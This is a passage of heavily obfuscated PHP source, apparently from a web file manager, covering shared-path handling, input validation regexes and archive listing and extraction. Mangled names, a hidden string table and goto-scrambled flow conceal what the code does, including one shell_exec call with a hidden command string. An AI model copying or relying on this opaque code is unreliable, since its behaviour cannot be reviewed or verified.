$F®‰³ÔğÜß; $dÜ”°ƒé¢§ = $this->model->addFileByRemote($b¤‹î›ù ä[$eÍİİ™áĞõ[379]], $dÚ… ¢• Ş, $F®‰³ÔğÜß, $DÛŞÊğ–Ò, $A‰âšßÀ÷ë); return $this->getPathOuter($dÜ”°ƒé¢§); } public function uploadLink($dí¯»¾ŠŸ, $F„êäìÛà™ = 0) { $eÒõôŞî·Æ =& $_SERVER[¨¤¼…´]; $Fõñ„×ÔŒ = $this->parse($dí¯»¾ŠŸ); $dí¯»¾ŠŸ = Model($eÒõôŞî·Æ[556])->createFileName($Fõñ„×ÔŒ[$eÒõôŞî·Æ[85]]); $a¸´¤öŞ”™ = IO::uploadLink($dí¯»¾ŠŸ, $F„êäìÛà™); return $a¸´¤öŞ”™; } public function fileNameAuto($c¬˜‹¯¹, $cá‡ÇÔÇ»è, $CàÁÁñîß¸ = REPEAT_REPLACE, $FŞ›×œ¡Ñ = false) { return $this->model->fileNameAuto($c¬˜‹¯¹, $cá‡ÇÔÇ»è, $CàÁÁñîß¸, $FŞ›×œ¡Ñ); } public function fileNameExist($c°•òïĞÚê, $CÕîïãòÇ) { return $this->model->fileNameExist($c°•òïĞÚê, $CÕîïãòÇ); } protected function _fileOut($FêŒ»ä¥ÑÅ, $f±»¿çã§Å = false, $aòÁÍë”Ê… = false, $Fæ†•ßêÈŠ = '', $c¦éÍ•Î·¼ = false) { goto eˆŸ¥¢ŒÚ²; aî÷¨Õğäš: $e‚ĞÒÇ¹Àô = $this->model->fileInfoGet($FêŒ»ä¥ÑÅ); $Fæ†•ßêÈŠ = $e‚ĞÒÇ¹Àô[$BÇ¥œÔòÍÀ[177]] ? $e‚ĞÒÇ¹Àô[$BÇ¥œÔòÍÀ[177]] : $Fæ†•ßêÈŠ; $F¨Ô¸¾…ê… = isset($GLOBALS[$BÇ¥œÔòÍÀ[1111]]) ? $GLOBALS[$BÇ¥œÔòÍÀ[1111]] : $aòà´Äİ¦î[$BÇ¥œÔòÍÀ[38]]; goto FË‹‰š®Å—; FË‹‰š®Å—: if ($c¦éÍ•Î·¼) { return IO::fileOutServer($e‚ĞÒÇ¹Àô[$BÇ¥œÔòÍÀ[85]], $f±»¿çã§Å, $F¨Ô¸¾…ê…, $Fæ†•ßêÈŠ); } IO::fileOut($e‚ĞÒÇ¹Àô[$BÇ¥œÔòÍÀ[85]], $f±»¿çã§Å, $F¨Ô¸¾…ê…, $Fæ†•ßêÈŠ); goto cÈ–¦ãÖ‰ö; eˆŸ¥¢ŒÚ²: $BÇ¥œÔòÍÀ =& $_SERVER[¨¤¼…´]; $aòà´Äİ¦î = $this->model->sourceInfo($FêŒ»ä¥ÑÅ); if ($aòà´Äİ¦î[$BÇ¥œÔòÍÀ[382]] == $BÇ¥œÔòÍÀ[93]) { header($BÇ¥œÔòÍÀ[1110]); die; } goto aî÷¨Õğäš; cÈ–¦ãÖ‰ö: } public function fileOut($cî‡µ„·öĞ, $aÆÇŠËŞÅ = false, $bÑ¯ŞäÀ» = false, $cÓñ«ôÍ‹ = '') { $this->_fileOut($cî‡µ„·öĞ, $aÆÇŠËŞÅ, $bÑ¯ŞäÀ», $cÓñ«ôÍ‹); } public function fileOutServer($C¤ï®¡Û·Ì, $d‰¸Óµ·’ = false, $dœ›ÆÇ’İ = false, $E‚Úù¹„º = '') { $this->_fileOut($C¤ï®¡Û·Ì, $d‰¸Óµ·’, $dœ›ÆÇ’İ, $E‚Úù¹„º, !0); } protected function _fileOutImage($Féí‹…„‘, $C°”§ÒğÌè = 250) { goto Eó•ê§½¥î; DšÄªøÓá: $e¯¦ƒÛï·Ø = $this->model->fileInfoGet($Féí‹…„‘); $e¯¦ƒÛï·Ø[$C•Û¾ìŠÍ¦[38]] = $fäËĞÈÊÄÎ[$C•Û¾ìŠÍ¦[38]]; $e¯¦ƒÛï·Ø[$C•Û¾ìŠÍ¦[170]] = $fäËĞÈÊÄÎ[$C•Û¾ìŠÍ¦[170]]; goto FÄğ¼ßƒ±ù; FÄğ¼ßƒ±ù: $GLOBALS[$C•Û¾ìŠÍ¦[1111]] = $e¯¦ƒÛï·Ø[$C•Û¾ìŠÍ¦[38]]; $GLOBALS[$C•Û¾ìŠÍ¦[169]] = $e¯¦ƒÛï·Ø; IO::fileOutImage($e¯¦ƒÛï·Ø[$C•Û¾ìŠÍ¦[85]], $C°”§ÒğÌè); goto C§Õé™ô; Eó•ê§½¥î: $C•Û¾ìŠÍ¦ =& $_SERVER[¨¤¼…´]; $fäËĞÈÊÄÎ = $this->model->pathInfo($Féí‹…„‘); if ($fäËĞÈÊÄÎ[$C•Û¾ìŠÍ¦[382]] == $C•Û¾ìŠÍ¦[93]) { show_json($C•Û¾ìŠÍ¦[1112] . $Féí‹…„‘, !1); } goto DšÄªøÓá; C§Õé™ô: } public function fileOutImage($CÒÍ…÷À¿, $B´çßğ©ö = 250) { $this->_fileOutImage($CÒÍ…÷À¿, $B´çßğ©ö); } public function fileOutImageServer($c´ñó˜æé¥, $FŸö§ÀŸÅ = 250) { $this->_fileOutImage($c´ñó˜æé¥, $FŸö§ÀŸÅ); } public function link($B‚Ğ·ä¥Äó, $A©ô„°¥ƒ = '') { $eš´öŸë–‡ = $this->model->fileInfoGet($B‚Ğ·ä¥Äó); return IO::link($eš´öŸë–‡[$_SERVER[¨¤¼…´][85]], $A©ô„°¥ƒ); } protected function parse($cªøíà‘£ª) { $e‹ìË÷ŒÇ =& $_SERVER[¨¤¼…´]; if (strstr($cªøíà‘£ª, $e‹ìË÷ŒÇ[8]) === !1) { return array($e‹ìË÷ŒÇ[397] => intval($cªøíà‘£ª), $e‹ìË÷ŒÇ[85] => $e‹ìË÷ŒÇ[43], $e‹ìË÷ŒÇ[1108] => array()); } $BÖß¥¹Ş­ğ = explode($e‹ìË÷ŒÇ[8], trim($cªøíà‘£ª, $e‹ìË÷ŒÇ[8])); if (count($BÖß¥¹Ş­ğ) < 2) { show_tips($cªøíà‘£ª . $e‹ìË÷ŒÇ[1113]); } return array($e‹ìË÷ŒÇ[397] => intval($BÖß¥¹Ş­ğ[0]), $e‹ìË÷ŒÇ[85] => $BÖß¥¹Ş­ğ[1], $e‹ìË÷ŒÇ[1108] => array_slice($BÖß¥¹Ş­ğ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($aÜˆîÑ¶ƒø) { $this->pathParse = $aÜˆîÑ¶ƒø; $this->model = Model($_SERVER[¨¤¼…´][1107]); } public function getPathOuter($Déèİç—ø©) { $aÓ™ÑĞİĞµ =& $_SERVER[¨¤¼…´]; if (!$Déèİç—ø©) { return $Déèİç—ø©; } $B†Ìê»½åÏ = $this->parse($Déèİç—ø©); return trim(KodIO::makeShare($this->pathParse[$aÓ™ÑĞİĞµ[379]], $B†Ìê»½åÏ[$aÓ™ÑĞİĞµ[379]]), $aÓ™ÑĞİĞµ[8]); } protected function infoParse($CÇ”ŞİªÇí, $AÒÙí‡‹È = false, $CÙ¼… ÖÚ = false) { $Aôñˆ®œŒÛ =& $_SERVER[¨¤¼…´]; $b›ŸÕá¯å = $this->pathParse[$Aôñˆ®œŒÛ[379]]; $AŒ«°ˆŞ = trim($this->pathParse[$Aôñˆ®œŒÛ[1003]], $Aôñˆ®œŒÛ[8]); return Action($Aôñˆ®œŒÛ[1114])->sharePathInfo($b›ŸÕá¯å, $AŒ«°ˆŞ); } public function infoFull($fÜÃó‹Š¥£) { $fª¥´ªØ =& $_SERVER[¨¤¼…´]; $Fæ´·Ÿß‡ª = explode($fª¥´ªØ[8], trim($fÜÃó‹Š¥£, $fª¥´ªØ[8])); if (count($Fæ´·Ÿß‡ª) > 1) { $Aï¯–˜×¶” = implode($fª¥´ªØ[8], array_splice($Fæ´·Ÿß‡ª, 1)); $AĞô„£À¹» = $this->model->pathInfoByPath($Fæ´·Ÿß‡ª[0], $Aï¯–˜×¶”); if (!$AĞô„£À¹») { return !1; } $this->pathParse[$fª¥´ªØ[1003]] = $AĞô„£À¹»[$fª¥´ªØ[381]]; } return $this->infoParse($fÜÃó‹Š¥£); } public function listAll($Cœ“ÎÄÍåÄ) { goto A ™Ú÷àğ; A ™Ú÷àğ: $a…ß‰¬Â‘ =& $_SERVER[¨¤¼…´]; $bÀõó˜øÕø = IO::info($this->pathParse[$a…ß‰¬Â‘[85]]); if (!$bÀõó˜øÕø) { return array(); } goto a—‹š£°§š; eÙùµª ô: foreach ($a¯ïëƒ„ğ‹ as &$føŞ»¥²Æ) { check_abort(); $føŞ»¥²Æ[$a…ß‰¬Â‘[403]] = $AÎ®‹é->_shareItemeParse($føŞ»¥²Æ[$a…ß‰¬Â‘[403]], $eªÛøÄ¿‘´); } unset($føŞ»¥²Æ); return $a¯ïëƒ„ğ‹; goto bìÎ…êÎíğ; a—‹š£°§š: $a¯ïëƒ„ğ‹ = $this->model->listAll($Cœ“ÎÄÍåÄ); $eªÛøÄ¿‘´ = Model($a…ß‰¬Â‘[548])->getInfo($bÀõó˜øÕø[$a…ß‰¬Â‘[452]]); $AÎ®‹é = Action($a…ß‰¬Â‘[1114]); goto eÙùµª ô; bìÎ…êÎíğ: } } goto fÂšªáÊ; f½¤÷Ğ„¥Ó: if (!function_exists($_SERVER[¨¤¼…´][1865])) { function imagecreatefrombmp($d¸”†ˆÔß) { return ImageGdBMP::load($d¸”†ˆÔß); } } class Input { public static function getArray($BÛ‹³ÌÚôÓ) { goto B‡×Ç„£¥®; e‚ªø§ßÔÜ: if (count($EŞË†‘ç—) > 0) { show_json(implode($BÜÂÅ†ï¿Û[1870], $EŞË†‘ç—), !1); } return $C‰†¶²—Íİ; goto AÅÇ†Óµ¤°; B‡×Ç„£¥®: $BÜÂÅ†ï¿Û =& $_SERVER[¨¤¼…´]; global $in; $C‰†¶²—Íİ = array(); goto d•¡Á•Æ”Š; d•¡Á•Æ”Š: $EŞË†‘ç— = array(); $côí“äƒø¬ = LNG($BÜÂÅ†ï¿Û[1866]); foreach ($BÛ‹³ÌÚôÓ as $d…³¤’ÅØš => $c©†ÇˆÜ±×) { goto f»ñÄÍ‰¨Ë; b’äëŠœ«¹: if (isset($c©†ÇˆÜ±×[$BÜÂÅ†ï¿Û[1869]]) && !self::check($in[$d…³¤’ÅØš], $c©†ÇˆÜ±×[$BÜÂÅ†ï¿Û[1869]], $dÙã¯Û¢İØ)) { if (array_key_exists($BÜÂÅ†ï¿Û[1868], $c©†ÇˆÜ±×)) { if (!is_null($c©†ÇˆÜ±×[$BÜÂÅ†ï¿Û[1868]])) { $C‰†¶²—Íİ[$dî…òîƒÖ¸] = $c©†ÇˆÜ±×[$BÜÂÅ†ï¿Û[1868]]; } } else { $EŞË†‘ç—[] = $a ÖˆØ¬ğµ; } continue; } $C‰†¶²—Íİ[$dî…òîƒÖ¸] = $in[$d…³¤’ÅØš]; goto bâàÀßÌŠ–; f»ñÄÍ‰¨Ë: $a ÖˆØ¬ğµ = _get($c©†ÇˆÜ±×, $BÜÂÅ†ï¿Û[1235], $côí“äƒø¬ . $BÜÂÅ†ï¿Û[866] . $d…³¤’ÅØš); $dî…òîƒÖ¸ = $d…³¤’ÅØš; if (isset($c©†ÇˆÜ±×[$BÜÂÅ†ï¿Û[1867]]) && $c©†ÇˆÜ±×[$BÜÂÅ†ï¿Û[1867]]) { $dî…òîƒÖ¸ = $c©†ÇˆÜ±×[$BÜÂÅ†ï¿Û[1867]]; } goto f¤Û‹êõ®¡; f¤Û‹êõ®¡: if (!array_key_exists($d…³¤’ÅØš, $in)) { if (array_key_exists($BÜÂÅ†ï¿Û[1868], $c©†ÇˆÜ±×)) { if (!is_null($c©†ÇˆÜ±×[$BÜÂÅ†ï¿Û[1868]])) { $C‰†¶²—Íİ[$dî…òîƒÖ¸] = $c©†ÇˆÜ±×[$BÜÂÅ†ï¿Û[1868]]; } } else { if (isset($c©†ÇˆÜ±×[$BÜÂÅ†ï¿Û[1869]])) { $EŞË†‘ç—[] = $a ÖˆØ¬ğµ; } } continue; } if (isset($c©†ÇˆÜ±×[$BÜÂÅ†ï¿Û[1869]]) && $c©†ÇˆÜ±×[$BÜÂÅ†ï¿Û[1869]] == $BÜÂÅ†ï¿Û[295]) { $féå«Ÿ® = json_decode($in[$d…³¤’ÅØš], !0); if (is_array($féå«Ÿ®)) { $C‰†¶²—Íİ[$dî…òîƒÖ¸] = $féå«Ÿ®; } else { if (array_key_exists($BÜÂÅ†ï¿Û[1868], $c©†ÇˆÜ±×)) { if (!is_null($c©†ÇˆÜ±×[$BÜÂÅ†ï¿Û[1868]])) { $C‰†¶²—Íİ[$dî…òîƒÖ¸] = $c©†ÇˆÜ±×[$BÜÂÅ†ï¿Û[1868]]; } } else { $EŞË†‘ç—[] = $a ÖˆØ¬ğµ; } } continue; } $dÙã¯Û¢İØ = _get($c©†ÇˆÜ±×, $BÜÂÅ†ï¿Û[1003]); goto b’äëŠœ«¹; bâàÀßÌŠ–: } goto e‚ªø§ßÔÜ; AÅÇ†Óµ¤°: } public static function reg($Cæ™…õÜØÇ = "\x72\145\161\165\151\162\145") { static $f‹ß¾ßğÇÄ = array("\162\x65\x71\165\x69\x72\145" => "\x2e\53", "\x6e\165\x6d\x62\145\x72" => "\x5c\x64\x2b", "\151\x6e\164\145\147\x65\162" => "\x5c\x64\x2b", "\150\145\x78" => "\x5b\x30\55\71\101\55\x46\x61\x2d\x66\135\53", "\x69\156\164" => "\x5b\x2d\x5c\x2b\135\77\x5c\x64\x2b", "\142\157\x6f\154" => "\x30\174\x31", "\x66\154\157\x61\164" => "\133\x2d\x5c\53\x5d\x3f\x5c\144\53\50\x5c\56\x5c\144\53\51\77", "\x65\x6e\x67\x6c\151\163\150" => "\133\x41\55\x5a\141\55\x7a\40\135\x2b", "\x63\x68\x69\156\x65\163\x65" => "\133\x5c\x78\173\x34\145\60\60\175\55\134\x78\x7b\x39\x66\x61\65\175\135\x2b", "\x68\x61\x73\x43\x68\x69\x6e\x65\x73\145" => "\57\x28\133\x5c\x78\173\x34\x65\x30\x30\x7d\x2d\134\170\173\71\146\141\x35\175\135\x2b\51\x2f\x75", "\145\155\141\151\154" => "\x5c\167\53\x28\133\x5c\56\134\x2d\x5d\134\x77\x2b\51\x2a\134\100\x5c\167\x2b\x28\133\134\x2e\134\x2d\x5d\x5c\167\x2b\x29\52\134\56\134\167\x2b", "\x70\x68\157\x6e\x65" => "\x31\133\x33\55\x39\x5d\134\144\173\x39\175", "\164\145\154\x70\x68\157\156\145" => "\50\134\x28\134\x64\x7b\x33\54\64\x7d\134\51\x7c\x5c\x64\x7b\x33\54\x34\x7d\x2d\x7c\x5c\163\51\x3f\x5c\144\x7b\67\x2c\x31\64\175", "\x75\162\x6c" => "\x28\x68\164\164\x70\x7c\146\164\x70\x7c\150\164\164\160\163\51\72\134\x2f\134\x2f\x5b\x5c\x77\134\55\x5f\135\x2b\50\x5c\56\x5b\x5c\167\x5c\x2d\x5f\135\53\x29\53\50\133\x5c\x77\x5c\x2d\134\56\54\x40\x3f\136\75\45\x26\x3a\x5c\x2f\x7e\x5c\x2b\x23\x5d\52\133\134\x77\x5c\55\134\x40\77\136\x3d\x25\x26\x5c\x2f\176\134\x2b\43\135\x29\x3f", "\x75\162\154\x46\x75\154\154" => "\x5b\x61\x2d\x7a\x41\55\172\135\x2b\x3a\x5c\57\134\57\133\136\134\x73\x5d\52", "\151\160" => "\x28\134\x64\x7b\x31\x2c\x33\175\134\x2e\x29\173\63\x7d\50\134\x64\x7b\x31\54\63\175\51", "\172\x69\160" => "\133\x31\55\71\135\x5c\x64\173\65\175\x28\x3f\x21\134\144\51", "\151\144\103\141\162\x64" => "\50\134\144\x7b\x31\x35\175\x29\174\50\134\x64\173\x31\x37\175\x28\x5c\144\174\130\x7c\x78\x29\51", "\143\x6f\x6c\x6f\x72" => "\x23\x28\x5b\x30\x2d\x39\x41\55\x46\x61\55\x66\135\173\63\x7d\x7c\x5b\x30\55\x39\101\x2d\106\141\x2d\146\x5d\173\x36\175\x29", "\164\x69\155\x65" => "\50\x5b\60\55\61\x5d\x5c\x64\x7c\x32\133\x30\x2d\x34\135\x29\72\x5b\x30\x2d\x35\x5d\x5c\x64", "\144\x61\x74\145" => "\134\x64\173\x34\x7d\133\55\x5c\57\x5d\x3f\x28\x30\133\61\x2d\71\135\x7c\x31\133\x30\55\x32\135\51\133\55\x5c\57\x5d\77\50\133\60\x2d\62\x5d\134\x64\x7c\x33\x5b\60\55\x31\135\x29", "\144\x61\164\145\124\151\x6d\x65" => "\x5c\144\x7b\64\175\133\x2d\x5c\57\x5d\77\50\x30\x5b\61\55\71\135\174\61\133\x30\x2d\x32\x5d\51\133\55\134\57\135\x3f\x28\x5b\60\x2d\x32\135\x5c\144\174\63\x5b\x30\55\61\x5d\x29\x5c\163\53\50\x5b\60\x2d\x31\x5d\x5c\144\174\62\133\60\55\x34\x5d\51\72\x5b\60\x2d\65\135\134\x64", "\x70\x61\163\163\167\x6f\x72\144" => "\x28\77\75\x2e\52\134\x64\51\50\77\x3d\x2e\52\x5b\x61\x2d\172\x5d\51\50\77\x3d\x2e\x2a\x5b\101\x2d\x5a\135\x29\x2e\173\x38\54\x32\60\175", "\x6b\145\x79" => "\133\x41\x2d\x5a\x61\x2d\172\60\55\x39\137\134\x2d\x5c\56\135\x2b", "\153\145\x79\106\165\154\x6c" => "\x5b\101\55\132\141\55\172\x30\55\x39\137\134\55\134\x2e\x5c\163\x2c\135\53"); if (!$Cæ™…õÜØÇ) { return $f‹ß¾ßğÇÄ; } return $f‹ß¾ßğÇÄ[$Cæ™…õÜØÇ]; } public static function check($bƒïçÙ³Áå, $fÙ¯á°‰ŒÆ, $b½¶ŞÎÀß = null) { $F¼»ô½­Âª =& $_SERVER[¨¤¼…´]; switch ($fÙ¯á°‰ŒÆ) { case $F¼»ô½­Âª[7]: return in_array($bƒïçÙ³Áå, $b½¶ŞÎÀß); break; case $F¼»ô½­Âª[1871]: return floatval($bƒïçÙ³Áå) > $b½¶ŞÎÀß; break; case $F¼»ô½­Âª[1872]: return floatval($bƒïçÙ³Áå) < $b½¶ŞÎÀß; break; case $F¼»ô½­Âª[338]: return strlen($bƒïçÙ³Áå) >= $b½¶ŞÎÀß[0] && strlen($bƒïçÙ³Áå) <= $b½¶ŞÎÀß[1]; break; case $F¼»ô½­Âª[338]: if (is_array($b½¶ŞÎÀß)) { return strlen($bƒïçÙ³Áå) >= $b½¶ŞÎÀß[0] && strlen($bƒïçÙ³Áå) <= $b½¶ŞÎÀß[1]; break; } else { return strlen($bƒïçÙ³Áå) == $b½¶ŞÎÀß; break; } case $F¼»ô½­Âª[334]: return floatval($bƒïçÙ³Áå) >= $b½¶ŞÎÀß[0] && floatval($bƒïçÙ³Áå) <= $b½¶ŞÎÀß[1]; break; } $DƒØºœ•¹Û = self::reg(!1); $fÙ¯á°‰ŒÆ = isset($DƒØºœ•¹Û[$fÙ¯á°‰ŒÆ]) ? $DƒØºœ•¹Û[$fÙ¯á°‰ŒÆ] : $fÙ¯á°‰ŒÆ; if (substr($fÙ¯á°‰ŒÆ, 0, 1) != $F¼»ô½­Âª[8]) { $fÙ¯á°‰ŒÆ = $F¼»ô½­Âª[1873] . $fÙ¯á°‰ŒÆ . $F¼»ô½­Âª[1874]; } return preg_match($fÙ¯á°‰ŒÆ, $bƒïçÙ³Áå) === 1; } public static function get($f¦¥Ó©‹ÓŸ, $eçÇ¡æƒ„ = null, $b‰ö¥Ì‹Ğ = null, $fˆÍ¡Áãˆ  = null) { goto bñ†”‡¶¢È; bñ†”‡¶¢È: $aĞ™àİ¾¿Ï =& $_SERVER[¨¤¼…´]; $D¤¶ÒÔ™ÜŠ = array(); if (!is_null($b‰ö¥Ì‹Ğ)) { $D¤¶ÒÔ™ÜŠ[$aĞ™àİ¾¿Ï[44]] = $b‰ö¥Ì‹Ğ; } goto c…ÌÑ±Îé; C©ÆòÇ«: return $f¬’¸ÌÌ¤’[$f¦¥Ó©‹ÓŸ]; goto BÕêì•†›¼; c…ÌÑ±Îé: if (!is_null($fˆÍ¡Áãˆ )) { $D¤¶ÒÔ™ÜŠ[$aĞ™àİ¾¿Ï[1003]] = $fˆÍ¡Áãˆ ; } if (!is_null($eçÇ¡æƒ„)) { $D¤¶ÒÔ™ÜŠ[$aĞ™àİ¾¿Ï[1869]] = $eçÇ¡æƒ„; } $f¬’¸ÌÌ¤’ = Input::getArray(array($f¦¥Ó©‹ÓŸ => $D¤¶ÒÔ™ÜŠ)); goto C©ÆòÇ«; BÕêì•†›¼: } } class KodArchive { static function init() { goto BÎä—¤åÔ…; DÏ¨ö·ÑŒè: define($FƒŒ½ŸÏ³â[1877], TEMP_FILES); define($FƒŒ½ŸÏ³â[1878], TEMP_FILES); define($FƒŒ½ŸÏ³â[1879], $FƒŒ½ŸÏ³â[1880]); goto cŒ •¹ø­Å; aªµ¥‡É«£: require_once ARCHIVE_LIB . $FƒŒ½ŸÏ³â[1886]; goto F‰â«×àŞÙ; BÎä—¤åÔ…: $FƒŒ½ŸÏ³â =& $_SERVER[¨¤¼…´]; if (defined($FƒŒ½ŸÏ³â[1875])) { return; } define($FƒŒ½ŸÏ³â[1875], SDK_DIR . $FƒŒ½ŸÏ³â[1876]); goto DÏ¨ö·ÑŒè; cŒ •¹ø­Å: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $FƒŒ½ŸÏ³â[1881]; require_once ARCHIVE_LIB . $FƒŒ½ŸÏ³â[1882]; goto fÄßøˆîªÆ; fÄßøˆîªÆ: require_once ARCHIVE_LIB . $FƒŒ½ŸÏ³â[1883]; require_once ARCHIVE_LIB . $FƒŒ½ŸÏ³â[1884]; require_once ARCHIVE_LIB . $FƒŒ½ŸÏ³â[1885]; goto aªµ¥‡É«£; F‰â«×àŞÙ: } static function checkIfType($bé›®¶–ª, $fÆˆ”Ğ…‡é) { goto a­°ÖÁÔ«À; a­°ÖÁÔ«À: $bŠø©‡‚·‘ =& $_SERVER[¨¤¼…´]; self::init(); $EªùÛ±°ƒ = array($bŠø©‡‚·‘[314] => array($bŠø©‡‚·‘[314], $bŠø©‡‚·‘[1887], $bŠø©‡‚·‘[1888], $bŠø©‡‚·‘[1889]), $bŠø©‡‚·‘[1890] => array($bŠø©‡‚·‘[1890], $bŠø©‡‚·‘[1891], $bŠø©‡‚·‘[1034], $bŠø©‡‚·‘[1032]), $bŠø©‡‚·‘[1035] => array($bŠø©‡‚·‘[1035], $bŠø©‡‚·‘[1892], $bŠø©‡‚·‘[1893], $bŠø©‡‚·‘[1894], $bŠø©‡‚·‘[1895], $bŠø©‡‚·‘[1896], $bŠø©‡‚·‘[1897])); goto dÃó®‘ìß; dÃó®‘ìß: $b§‡…àø†¯ = in_array($bé›®¶–ª, $EªùÛ±°ƒ[$fÆˆ”Ğ…‡é]); if ($b§‡…àø†¯ && ($fÆˆ”Ğ…‡é == $bŠø©‡‚·‘[314] || $fÆˆ”Ğ…‡é == $bŠø©‡‚·‘[1890]) && (!function_exists($bŠø©‡‚·‘[1898]) || !function_exists($bŠø©‡‚·‘[1899]))) { show_tips($bŠø©‡‚·‘[1900]); } if ($b§‡…àø†¯ && $fÆˆ”Ğ…‡é == $bŠø©‡‚·‘[1035] && (!function_exists($bŠø©‡‚·‘[1901]) || !strstr(shell_exec($bŠø©‡‚·‘[1902]), $bŠø©‡‚·‘[1903]))) { show_tips($bŠø©‡‚·‘[1904]); } goto E‰¬·¶Å; E‰¬·¶Å: return $b§‡…àø†¯; goto F³öòÈÍô³; F³öòÈÍô³: } static function listContent($fÑñº‰õ¼µ, $C§¸îØ´‹ = true) { $D±«™Ü±¦ =& $_SERVER[¨¤¼…´]; self::init(); $FÇ¡øÎÑ­º = !empty($GLOBALS[$D±«™Ü±¦[1039]]) ? $GLOBALS[$D±«™Ü±¦[1039]] : get_path_ext($fÑñº‰õ¼µ); $F¸ñ¼¸“Ş = !1; if (self::checkIfType($FÇ¡øÎÑ­º, $D±«™Ü±¦[1890])) { $a‚œåÀÆÒñ = PclTarList($fÑñº‰õ¼µ, $FÇ¡øÎÑ­º); $F¸ñ¼¸“Ş = array(); for ($Fè²²–â½ = 0; $Fè²²–â½ < count($a‚œåÀÆÒñ); $Fè²²–â½++) { $Aˆ‰ëÎ­É‹ = $a‚œåÀÆÒñ[$Fè²²–â½]; if ($Aˆ‰ëÎ­É‹[$D±«™Ü±¦[1905]] == $D±«™Ü±¦[1906] || $Aˆ‰ëÎ­É‹[$D±«™Ü±¦[1905]] == $D±«™Ü±¦[1907]) { continue; } if ($C§¸îØ´‹) { $Aˆ‰ëÎ­É‹[$D±«™Ü±¦[1908]] = ltrim($Aˆ‰ëÎ­É‹[$D±«™Ü±¦[1908]], $D±«™Ü±¦[1145]); } if ($Aˆ‰ëÎ­É‹[$D±«™Ü±¦[1905]] == $D±«™Ü±¦[1909]) { $Aˆ‰ëÎ­É‹[$D±«™Ü±¦[86]] = !0; } else { $Aˆ‰ëÎ­É‹[$D±«™Ü±¦[86]] = !1; } $Aˆ‰ëÎ­É‹[$D±«™Ü±¦[1027]] = $Fè²²–â½; $F¸ñ¼¸“Ş[] = $Aˆ‰ëÎ­É‹; } } else { if (self::checkIfType($FÇ¡øÎÑ­º, $D±«™Ü±¦[1035])) { $E¦Üæ­Õ²‹ = kodRarArchive::listContent($fÑñº‰õ¼µ); if (!$E¦Üæ­Õ²‹[$D±«™Ü±¦[1023]]) { return $E¦Üæ­Õ²‹; } else { $F¸ñ¼¸“Ş = $E¦Üæ­Õ²‹[$D±«™Ü±¦[1025]]; } } else { if (kodZipArchive::support($D±«™Ü±¦[367])) { $F¸ñ¼¸“Ş = kodZipArchive::listContent($fÑñº‰õ¼µ); } else { $DÅ§ÌôÂ¨À = new PclZip($fÑñº‰õ¼µ); $F¸ñ¼¸“Ş = $DÅ§ÌôÂ¨À->listContent(); } } } if ($F¸ñ¼¸“Ş) { $EóÛ²±õ = unzip_charset_get($F¸ñ¼¸“Ş); $C§¸îØ´‹ = $C§¸îØ´‹ && function_exists($D±«™Ü±¦[75]); for ($Fè²²–â½ = 0; $Fè²²–â½ < count($F¸ñ¼¸“Ş); $Fè²²–â½++) { $F¸ñ¼¸“Ş[$Fè²²–â½][$D±«™Ü±¦[1908]] = str_replace(array($D±«™Ü±¦[1062], $D±«™Ü±¦[1910]), $D±«™Ü±¦[753], $F¸ñ¼¸“Ş[$Fè²²–â½][$D±«™Ü±¦[1908]]); if ($C§¸îØ´‹) { $F¸ñ¼¸“Ş[$Fè²²–â½][$D±«™Ü±¦[1908]] = iconv_to($F¸ñ¼¸“Ş[$Fè²²–â½][$D±«™Ü±¦[1908]], $EóÛ²±õ, $D±«™Ü±¦[339]); unset($F¸ñ¼¸“Ş[$Fè²²–â½][$D±«™Ü±¦[1911]]); } } return array($D±«™Ü±¦[1023] => !0, $D±«™Ü±¦[1025] => $F¸ñ¼¸“Ş); } else { return array($D±«™Ü±¦[1023] => !1, $D±«™Ü±¦[1025] => $F¸ñ¼¸“Ş); } } static function extract($AõÀºŒ«õ÷, $F¤Ğ¢¦¼Ää, $ašáÓšœˆç = "\x2d\x31", &$fÌ™äèÇÅ¼ = false) { goto eÒÃŞÓ–µ‹; DÆºˆËøˆ‘: if (self::checkIfType($b“Ë Ä´Ö¬, $a‘“ô¾ÇÙ•[1890])) { if ($ašáÓšœˆç != $a‘“ô¾ÇÙ•[1022]) { $Aå¯º·Û°± = unzip_pre_name($Aå¯º·Û°±); $bÀÍÍ®ëª = unzip_pre_name($bÀÍÍ®ëª); $d¢ôœµ…¯Ç = PclTarExtractList($AõÀºŒ«õ÷, array($Aå¯º·Û°±), $F¤Ğ¢¦¼Ää, $bÀÍÍ®ëª, $b“Ë Ä´Ö¬); } else { $d¢ôœµ…¯Ç = PclTarExtract($AõÀºŒ«õ÷, $F¤Ğ¢¦¼Ää, $a‘“ô¾ÇÙ•[18], $b“Ë Ä´Ö¬); } return array($a‘“ô¾ÇÙ•[1023] => $d¢ôœµ…¯Ç, $a‘“ô¾ÇÙ•[1025] => PclErrorString(!0)); } else { if (self::checkIfType($b“Ë Ä´Ö¬, $a‘“ô¾ÇÙ•[1035])) { return kodRarArchive::extract($AõÀºŒ«õ÷, $F¤Ğ¢¦¼Ää, $b“Ë Ä´Ö¬, $fÌ™äèÇÅ¼); } else { if (kodZipArchive::support($a‘“ô¾ÇÙ•[1912])) { return kodZipArchive::extract($AõÀºŒ«õ÷, $F¤Ğ¢¦¼Ää, $fÌ™äèÇÅ¼); } else { $E‚×½ËÒ„Ê = new PclZip($AõÀºŒ«õ÷); if ($ašáÓšœˆç != $a‘“ô¾ÇÙ•[1022]) { $d¢ôœµ…¯Ç = $E‚×½ËÒ„Ê->extract(PCLZIP_OPT_PATH, $F¤Ğ¢¦¼Ää, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $a‘“ô¾ÇÙ•[1913], PCLZIP_OPT_BY_NAME, $CßŒôô¹°²[$a‘“ô¾ÇÙ•[1908]], PCLZIP_OPT_REMOVE_PATH, $bÀÍÍ®ëª, PCLZIP_OPT_REPLACE_NEWER); } else { $d¢ôœµ…¯Ç = $E‚×½ËÒ„Ê->extract(PCLZIP_OPT_PATH, $F¤Ğ¢¦¼Ää, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $a‘“ô¾ÇÙ•[1913], PCLZIP_OPT_REPLACE_NEWER); } return array($a‘“ô¾ÇÙ•[1023] => $d¢ôœµ…¯Ç, $a‘“ô¾ÇÙ•[1025] => $E‚×½ËÒ„Ê->errorName(!0)); } } } return array($a‘“ô¾ÇÙ•[1023] => !1, 